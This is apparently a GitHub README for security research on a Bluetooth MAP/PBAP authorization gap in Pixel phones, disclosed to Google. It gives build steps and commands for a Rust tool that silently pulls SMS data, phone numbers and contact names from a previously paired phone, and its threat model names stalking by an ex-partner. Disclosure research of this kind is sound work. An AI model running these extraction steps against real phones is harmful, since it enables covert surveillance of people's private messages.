# Pixel 9a Bluetooth MAP and PBAP Research

Research and tooling for a design-level authorization gap in Android's Message Access Profile (MAP) and Phone Book Access Profile (PBAP) implementation on the Google Pixel 9a. The tool has been tested and also works on a Pixel 6a device. It is assumed that this code base will work on any Android phone, but testing has not taken place outside of Pixel phones. A previously bonded Bluetooth device can silently retrieve text messages, phone numbers, and contact names, with no on-device notification or consent prompts per session. 

This repo is based on 74 pages of research that I submitted to google during the course of November 2025 to March of 2026. All responsible disclosure practices were followed. The concept of this research was taking the bluetooth MAP profile that was originally created to exchange information over a vehicle infotainment system, and then adapting that profile to extract information from a phone to a linux computer. The result is that personally identifiable information is synced in a linux computer terminal. During the course of this research, I also found an unexpected state transition in com.android.bluetooth.btservice. To reproduce this unexpected state transition log, instructions are also provided.

---

## TL;DR

| Item | Value |
|---|---|
| Target service | `com.android.bluetooth.map.BluetoothMapObexServer`, RFCOMM channel 4 (subject to change per update) |
| Behavior | Bonded device silently retrieves SMS/MMS metadata |
| Data exposed | Sender names, phone numbers, timestamps, message handles (metadata) |
| User interaction | None after pairing (no notification, no consent prompt) |
| Confirmed on | Android 17, Pixel 9a, build `CP2A.260705.006` |
| Classification | Design-level authorization gap |

---

## Threat model

This tool demonstrates an insider-threat scenario: someone with legitimate —
often temporary — access to a device establishes a Bluetooth pairing record,
then extracts message data much later, without the owner's knowledge.

Examples:

- An IT support worker who sets up company phones, pairs their own device during
  provisioning, and retrieves messages after the phone is issued to an employee
- A jealous ex-partner who paired their device while they had access to the phone
- Anyone with brief unsupervised access to an unlocked phone who completes a
  pairing

Because the pairing record persists for an indefinite period, the silent
retrieval can happen well after the initial access — with no notification, pop-up, or
other indication on the phone at the time of extraction.

---

## Repository layout

```
├── README.md      # this file
├── Cargo.toml     # Rust package manifest (binary: obex-map-get)
├── Cargo.lock     # locked dependency versions
├── .gitignore
└── src/
    └── main.rs    # OBEX MAP/PBAP exfiltration tool source
```

---

## Build

```bash
cd ~/Android-Phone-Pixel-9a-Research-Bluetooth-Data-Extraction/
sudo apt update
sudo apt install -y build-essential pkg-config libbluetooth-dev libssl-dev cargo bluez adb
cargo build --release
```

---

## Usage

Extract the MAP channel for the target device:

```bash
MAP_CHANNEL=$(sdptool -i hci0 browse [PIXEL_MAC] | grep -A 5 "Message Access" | grep "Channel" | grep -o "[0-9]*")
echo "MAP Channel: $MAP_CHANNEL"
```

Run the exfiltration tool (this triggers a pairing pop-up on the target — the
user must allow message access, after which text-message data is extracted):

```bash
./target/release/obex-map-get [PIXEL_MAC] [MAP_CHANNEL] --repeat=1 --preview-body=512
```

> **Note:** Sometimes this command fails to output the XML data. If so, run:

```bash
stdbuf -i0 -o0 -e0 ./target/release/obex-map-get [PIXEL_MAC] [MAP CHANNEL] --repeat=1 --preview-body=5000 --output=evidence.bin
```

After pairing, disconnect the computer from the phone:

```
Settings -> Connected devices -> Select paired computer -> Disconnect
```

Run the command again without the connection. The exfiltration of a text
message, phone number, and sender name prints to the terminal with no
notification, pop-up, or other indication on the phone. The phone does not need to be connected via bluetooth after the initial pairing in order for the data exfiltration to occur in the future.:

```bash
./target/release/obex-map-get [PIXEL_MAC] [MAP CHANNEL] --repeat=1 --preview-body=512
```
To test for the unexpected state transition during the extraction of information, follow these steps:

With the phone plugged in via usb and usb debugging enabled, we now execute the following command.: 

```
adb logcat -v time | grep -E "BluetoothMapObexServer|UserManagerService" 
```
This will enable logging of system messages from the android device

Next we must execute: 

```
./target/release/obex-map-get [PIXEL_MAC] [MAP CHANNEL] --repeat=1 --preview-body=512
```
Our next move is to execute

```
adb shell pidof com.google.android.bluetooth 
```
This command is used to determine the process id.

In the first command it was determined that the process id was 2161, so the next step is to execute the following command (See screenshot below):
```
adb logcat | grep [Enter PID prior step here]
```
<img width="955" height="49" alt="image" src="https://github.com/user-attachments/assets/4d08878a-1577-47a7-9370-10e30beda272" />

In this image, we see evidence of the unexpected state transition. 

To understand this, we must examine the following states found in BluetoothProfile.java android documentation: 

1. STATE_DISCONNECTED = 0 
2. STATE_CONNECTING = 1 (This is where security checks take place) 
3. STATE CONNECTED = 2 (This means data is now flowing) 
4. STATE DISCONNECTING = 3

See here for reference to these states in android google source code. https://android.googlesource.com/platform/frameworks/base/+/010bf37/core/java/android/bluetooth/BluetoothProfile.java

What the screenshot is saying is that there was an unexpected transition from state 0 to state 2. What this means is that state 1, or STATE_CONNECTING was bypassed.  The significance of [0 -> 2] is that the system is reporting that the MAP profile skipped State 1 entirely. 

Also, examining the code in the com.android.bluetooth.btservice we see the following code block

<img width="1235" height="118" alt="image" src="https://github.com/user-attachments/assets/a4468991-6166-4710-8c2b-71319a967173" />

In it, we see the debug log code that states, 
if (!isNormalStateTransition(i3, i2) { 
	Log.w(TAG, “updateOnProfileConnectionChanged: Unexpected transition. ” + str);


This line of code correlates to the message that I am once again pasting below. It demonstrates that this is not a normal state transition. 

<img width="955" height="49" alt="image" src="https://github.com/user-attachments/assets/9d5f72f5-b638-43f3-adb1-44169a8966c8" />

The full impact of this unexpected transition is indeterminate at this moment. 
